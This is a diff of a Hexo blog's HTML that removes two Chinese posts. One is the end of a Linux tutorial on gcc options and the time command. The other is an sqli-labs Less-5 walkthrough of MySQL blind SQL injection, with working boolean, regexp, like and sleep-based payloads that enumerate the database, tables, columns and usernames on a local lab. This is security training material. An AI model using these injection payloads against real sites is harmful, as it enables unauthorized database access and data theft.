-<p>-o ：output之意，用于指定生成一个可执行文件的文件名<br>-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序<br>-I ：增加编译时搜索头文件的路径<br>-L ：增加编译时搜索静态连接库的路径<br>-S ：把源文件生成汇编代码文件<br>-lm：表示标准库的目录中名为libm.a的函数库<br>-lpthread ：连接NPTL实现的线程库<br>-std= ：用于指定把使用的C语言的版本</p>
-<ul>
-<li>例如：</li>
-<li>把源文件test.c按照c99标准编译成可执行程序test<br>gcc -o test test.c -lm -std=c99<br>*把源文件test.c转换为相应的汇编程序源文件test.s<br>gcc -S test.c<h1 id="20、time命令"><a href="#20、time命令" class="headerlink" title="20、time命令"></a>20、time命令</h1></li>
-</ul>
-<p>该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：</p>
-<p>time ./process<br>time ps aux<br>在程序或命令运行结束后，在最后输出了三个时间，它们分别是：<br>user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；<br>system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；<br>real：实际时间，从command命令行开始执行到运行终止的消逝时间；</p>
-<h2 id="注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。"><a href="#注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。" class="headerlink" title="注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。"></a>注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。</h2><p>作者：ljianhui<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">https://blog.csdn.net/ljianhui/article/details/11100625/</a><br>版权声明：本文为博主原创文章，转载请附上博文链接！</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/mysql注入之盲注及sqli-labs05/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/21/mysql注入之盲注及sqli-labs05/" class="post-title-link" itemprop="url">mysql注入02及sqli-labs05</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-21 16:27:10 / Modified: 22:49:11" itemprop="dateCreated datePublished" datetime="2019-02-21T16:27:10+08:00">2019-02-21</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Mysql注入-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Mysql注入-sqlilabs</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>mysql注入之盲注<br>主要是我认为简单的一些基于布尔 SQL 盲注，同时将结合实际案例sqli-labs05</p>
-<h1 id="基于布尔-SQL-盲注———-构造逻辑判断"><a href="#基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="基于布尔 SQL 盲注———-构造逻辑判断"></a>基于布尔 SQL 盲注———-构造逻辑判断</h1><h2 id="截取字符及ASCII转换"><a href="#截取字符及ASCII转换" class="headerlink" title="截取字符及ASCII转换"></a>截取字符及ASCII转换</h2><p>left(database(),1)&gt;’s’ //left()函数<br>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位<br>▲ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</p>
-<h3 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h3><h4 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h4><p>ID:1’ and left(version(),1)=5–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/left1.png" alt=""></p>
-<h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><p>1.猜测数据库第一位<br> ID: 1’and left(database(),1)&gt;’a’–+<br>Database()为 security，所以我们看他的第一位是否 &gt;a,很明显的是 s&gt;a,因此返回正确。当 我们不知情的情况下，可以用二分法来提高注入的效率。<br>2.猜测数据库第二位 得知第一位为 s，我们看前两位是否大于 sa<br>  ID:1’and left(database(),2)&gt;’sa’–+</p>
-<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><ol>
-<li>security库下的第一个表： email   e=101 m=109<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/1.png" alt=""></li>
-<li>下一个字符，只需将substr（）函数下的第三个参数改为二<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/2.png" alt=""></li>
-<li>下一个表，只需将limit中的0，1 改为1，1  依此类推<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114–+<br>//此处 114 返回是正确的，因为第二个表示 referers表，所以第一位就是 r.<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/3.png" alt=""><h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4>下一步：表中的列：（一个个查过去比较麻烦，可以用正则来判断表中是否有某个列，针对性较强）<br>爆users表中的列<br>ID:1’and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 1,1),1,1))=117–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/4.png" alt=""><br>第一个字符为u  可以推测出第一个列为username<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4>爆username中的数据<br>ID:1’and ascii(substr((select username from users limit 1,1),1,1))=65–+<br>username中的第一行为A开头的用户名<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/5.png" alt=""></li>
-</ol>
-<h2 id="regexp-正则注入"><a href="#regexp-正则注入" class="headerlink" title="regexp 正则注入"></a>regexp 正则注入</h2><h3 id="正则注入介绍："><a href="#正则注入介绍：" class="headerlink" title="正则注入介绍："></a>正则注入介绍：</h3><p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
-<h3 id="用法介绍："><a href="#用法介绍：" class="headerlink" title="用法介绍："></a>用法介绍：</h3><p>select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 select user() regexp ‘^ro’来进行。<br>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
-<h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>1.爆表<br>查询库下是否有us开头的表名，<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则1.png" alt=""><br>严格匹配库中是否有一个表名为users的表<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^users$’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则2.png" alt=""><br>2.爆列<br>users表中是否一个username列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则3.png" alt=""><br>users表中是否一个password列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^password’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则4.png" alt=""></p>
-<p>3.爆数据<br>username列中是否存在一个用户名为dummy：<br>ID:1’and 1=(select 1 from users where username regexp’^dummy’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则5.png" alt=""></p>
-<h2 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a>like 匹配注入</h2><p>和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。</p>
-<h3 id="用法：select-user-like-‘ro-’"><a href="#用法：select-user-like-‘ro-’" class="headerlink" title="用法：select user() like ‘ro%’"></a>用法：select user() like ‘ro%’</h3><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>ID:1’and 1=(select 1 from users where username like ‘dummy’ limit 0,1)–+</p>
-<p><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/like.png" alt=""><br>延时注入 利用 sleep()函数进行注入<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>正确时：直接显示页面<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时1.png" alt=""><br>错误时，执行sleep（5）<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时2.png" alt=""><br>5秒延时后<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时3.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2325,7 +2209,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">61</span>
+                    <span class="site-state-item-count">65</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
